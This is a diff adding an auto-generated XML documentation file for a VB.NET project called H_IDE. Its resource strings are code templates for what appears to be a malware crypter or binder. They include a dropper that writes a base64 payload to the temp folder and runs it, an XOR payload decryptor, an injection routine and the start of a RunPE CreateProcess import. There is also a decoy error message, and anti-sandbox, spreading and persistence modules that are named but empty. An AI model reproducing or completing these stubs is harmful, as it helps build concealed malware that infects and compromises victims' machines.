@@ -1,0 +1,121 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+H_IDE
+</name>
+</assembly>
+<members>
+<member name="P:H_IDE.My.Resources.Resources.ResourceManager">
+	<summary>
+  Returns the cached ResourceManager instance used by this class.
+</summary>
+</member><member name="P:H_IDE.My.Resources.Resources.Culture">
+	<summary>
+  Overrides the current thread's CurrentUICulture property for all
+  resource lookups using this strongly typed resource class.
+</summary>
+</member><member name="P:H_IDE.My.Resources.Resources.AntiSandboxModule">
+	<summary>
+  Looks up a localized string similar to .
+</summary>
+</member><member name="P:H_IDE.My.Resources.Resources.BinderModule">
+	<summary>
+  Looks up a localized string similar to If Not IO.File.Exists(IO.Path.GetTempPath &amp; "%1%.txt") Then
+Dim %2% As String = %3% 
+IO.File.Delete(IO.Path.GetTempPath &amp; "%4%")
+IO.File.WriteAllBytes(IO.Path.GetTempPath &amp; "%4%", Convert.FromBase64String(%2%))
+Process.Start(IO.Path.GetTempPath &amp; "%4%")
+IO.File.WriteAllText(IO.Path.GetTempPath &amp; "%1%.txt", "%5%")
+Else
+End if.
+</summary>
+</member><member name="P:H_IDE.My.Resources.Resources.CriticalProcessModule">
+	<summary>
+  Looks up a localized string similar to .
+</summary>
+</member><member name="P:H_IDE.My.Resources.Resources.EncryptionModule">
+	<summary>
+  Looks up a localized string similar to Function decrypt(ByVal message As Byte(), ByVal password As String) As Byte()
+Dim passarr As Byte() = System.Text.Encoding.Default.GetBytes(password)
+Dim rand1 As Integer = message(message.Length - 1) Xor 112
+Dim outarr(message.Length) As Byte
+Dim u1 As Integer
+For i1 As Integer = 0 To message.Length - 1
+outarr(i1) = (message(i1) Xor rand1) Xor passarr(u1)
+If u1 = password.Length - 1 Then u1 = 0 Else u1 = u1 + 1
+Next
+ReDim Preserve outarr(message.Length - 2)
+Return outarr
+End Function.
+</summary>
+</member><member name="P:H_IDE.My.Resources.Resources.EndSubBase">
+	<summary>
+  Looks up a localized string similar to End Sub.
+</summary>
+</member><member name="P:H_IDE.My.Resources.Resources.FakeErrorMessage">
+	<summary>
+  Looks up a localized string similar to If Not IO.File.Exists(IO.Path.GetTempPath &amp; "%1%.txt") Then
+MsgBox("%2%", MsgBoxStyle.Critical, "%3%")
+IO.File.WriteAllText(IO.Path.GetTempPath &amp; "%1%.txt", "%4%")
+Else
+End If.
+</summary>
+</member><member name="P:H_IDE.My.Resources.Resources.InjectionModule">
+	<summary>
+  Looks up a localized string similar to IO.File.Delete(IO.Path.GetTempPath &amp; "%1%")
+IO.File.Copy("%2%", IO.Path.GetTempPath &amp; "%1%")
+Dim %3% As String = %4%
+Dim %5% as Byte() = decrypt(Convert.FromBase64String(%3%),"%6%")
+Run(IO.Path.GetTempPath &amp; "%1%", "", %5%, False).
+</summary>
+</member><member name="P:H_IDE.My.Resources.Resources.ModuleBase">
+	<summary>
+  Looks up a localized string similar to Imports System
+Imports Microsoft.VisualBasic
+Imports System.Runtime.InteropServices
+Imports System.Threading
+Imports System.Reflection
+Imports System.Text
+Imports System.Security
+Imports System.Diagnostics
+Module %1%
+Sub Main().
+</summary>
+</member><member name="P:H_IDE.My.Resources.Resources.ModuleEnd">
+	<summary>
+  Looks up a localized string similar to End Module.
+</summary>
+</member><member name="P:H_IDE.My.Resources.Resources.ProcessPersistanceModule">
+	<summary>
+  Looks up a localized string similar to .
+</summary>
+</member><member name="P:H_IDE.My.Resources.Resources.RunPeModule">
+	<summary>
+  Looks up a localized string similar to     &lt;DllImport("kernel32.dll", EntryPoint:="CreateProcess", CharSet:=CharSet.Unicode), SuppressUnmanagedCodeSecurity()&gt; _
+    Private Function CreateProcess( _
+    ByVal applicationName As String, _
+    ByVal commandLine As String, _
+    ByVal processAttributes As IntPtr, _
+    ByVal threadAttributes As IntPtr, _
+    ByVal inheritHandles As Boolean, _
+    ByVal creationFlags As UInteger, _
+    ByVal environment As IntPtr, _
+    ByVal currentDirectory As String, _
+    ByRef startupInfo As STARTUP_I [rest of string was truncated]";.
+</summary>
+</member><member name="P:H_IDE.My.Resources.Resources.SpreadModule">
+	<summary>
+  Looks up a localized string similar to .
+</summary>
+</member><member name="P:H_IDE.My.Resources.Resources.StartupModule">
+	<summary>
+  Looks up a localized string similar to .
+</summary>
+</member><member name="T:H_IDE.My.Resources.Resources">
+	<summary>
+  A strongly-typed resource class, for looking up localized strings, etc.
+</summary>
+</member>
+</members>
+</doc>
